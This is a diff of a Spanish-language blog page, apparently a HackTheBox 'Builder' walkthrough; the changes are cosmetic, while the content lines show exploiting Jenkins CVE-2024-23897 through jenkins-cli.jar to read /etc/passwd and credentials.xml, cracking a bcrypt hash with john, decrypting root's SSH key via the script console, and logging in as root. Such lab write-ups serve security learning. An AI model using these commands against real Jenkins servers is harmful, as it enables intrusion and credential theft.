@@ -41,23 +41,23 @@ Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la ve
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Builder Machine - HackTheBox">
-	<meta name="twitter:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Builder Machine - HackTheBox">
+  <meta name="twitter:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
 nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins
 Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441">
 
 <meta property="og:url" content="https://celero0.github.io/posts/builder/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="Builder Machine - HackTheBox">
-	<meta property="og:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Builder Machine - HackTheBox">
+  <meta property="og:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
 nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins
 Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2025-12-20T20:19:28+00:00">
-		<meta property="article:modified_time" content="2025-12-20T20:19:28+00:00">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-20T20:19:28+00:00">
+    <meta property="article:modified_time" content="2025-12-20T20:19:28+00:00">
 
 
 
@@ -82,7 +82,7 @@ Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb 
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -218,7 +218,7 @@ Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb 
   </a>
 </h1>
 <p><strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.74 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.74 -oG allPorts
 </span></span></code></pre></div><img src="/images/Pasted image 20250926155642.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins</p>
 <h1 id="enumeración-puerto-http-8080">
@@ -246,11 +246,11 @@ Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb 
 <p><img src="/images/Pasted image 20250926165017.png" style="width:100%; height:auto; display:block; margin:auto;">Hay un script que permite realizar la vulnerabilidad, pero también hay una forma manual de utilizarla:</p>
 <p><a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.md"  class="external-link" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.md</a></p>
 <p>Para hacerlo primero debemos command-line client &ldquo;jeknkins-cli.jar&rdquo;</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
 </span></span></code></pre></div><p>ó</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
 </span></span></code></pre></div><p>Ahora podemos leer los archivos con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/etc/passwd&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/etc/passwd&#34;</span>
 </span></span></code></pre></div><h2 id="archivos-de-usuario">
   Archivos de usuario
   <a class="heading-link" href="#archivos-de-usuario">
@@ -261,18 +261,18 @@ Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb 
 <p>Como conseguimos realizar un LFI ahora podemos leer archivos críticos de jenkins
 el archivo <code>/var/jenkins_home/users/users.xml</code> contiene nombres de usuarios de jenkins con el nombre de su directorio, en este caso <code>jennifer_12108429903186576833</code>
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/users/users.xml&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/users/users.xml&#34;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20250926173246.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Sabiendo el nombre del directorio podemos ver su archivo de configuración en</p>
 <p><code>/var/jenkins_home/users/&lt;nombre_usuario&gt;_.../config.xml</code></p>
 <p><strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&#34;</span>
 </span></span></code></pre></div><p>Donde encontramos el hash de la contraseña de jennifer</p>
 <img src="/images/Pasted image 20250926173553.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Que es <code>jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code>
 Lo guardaremos en hash.txt, y utilizamos john para desencriptarla
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>bcrypt --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>bcrypt --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash.txt
 </span></span></code></pre></div><img src="/images/Pasted image 20250926173752.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Con las credenciales: <code>jennifer:princess</code> nos conectaremos al login de Jenkins</p>
 <img src="/images/Pasted image 20250926173917.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -293,7 +293,7 @@ Lo guardaremos en hash.txt, y utilizamos john para desencriptarla
 <p>El fichero /var/jenkins_home/credentials.xml  almacena todas las credenciales que Jenkins utiliza para interactuar con otros servicios (claves SSH, contraseñas de bases de datos, tokens de API, etc. Las contraseñas están cifradas pero desde la página web http://10.10.11.10:8080/script se puede desencriptar la rsa key</p>
 <p>Haremos el siguiente comando para obtener la PrivateKey encripatada
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/credentials.xml&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/credentials.xml&#34;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20250926174737.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Al final aparece el usuario dueño dela private key, en este caso root</p>
 <img src="/images/Pasted image 20250926182636.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -301,7 +301,7 @@ Lo guardaremos en hash.txt, y utilizamos john para desencriptarla
 <img src="/images/rsajenkins.PNG" style="width:100%; height:auto; display:block; margin:auto;">
 <p>y para eliminar los espacios de la rsa.txt haremos el siguiente comando
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat rsa.txt | tr -d <span style="color:#a5d6ff">&#39;\n&#39;</span> &gt; rsa.key
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat rsa.txt | tr -d <span style="color:#a5d6ff">&#39;\n&#39;</span> &gt; rsa.key
 </span></span></code></pre></div><p>Ahora vamos a <code>http://10.10.11.10:8080/script</code> en la consola debemos pegar la siguiente línea: <code>println(hudson.util.Secret.fromString(&quot;{XXX=}&quot;).getPlainText())</code> donde las XXX son el texto copiado en rsa.key</p>
 <pre tabindex="0"><code>println(hudson.util.Secret.fromString(&#34;{XXX=}&#34;).getPlainText())
 </code></pre><p>Al correrlo obtendremos la RSA de root</p>
@@ -310,7 +310,7 @@ Lo guardaremos en hash.txt, y utilizamos john para desencriptarla
 <img src="/images/Pasted image 20250926182410.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>y luegos nos conectamos con el siguiente comando
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh root@10.10.11.10 -i id_rsa
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh root@10.10.11.10 -i id_rsa
 </span></span></code></pre></div><img src="/images/Pasted image 20250926182448.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="método-2">
   Método 2:
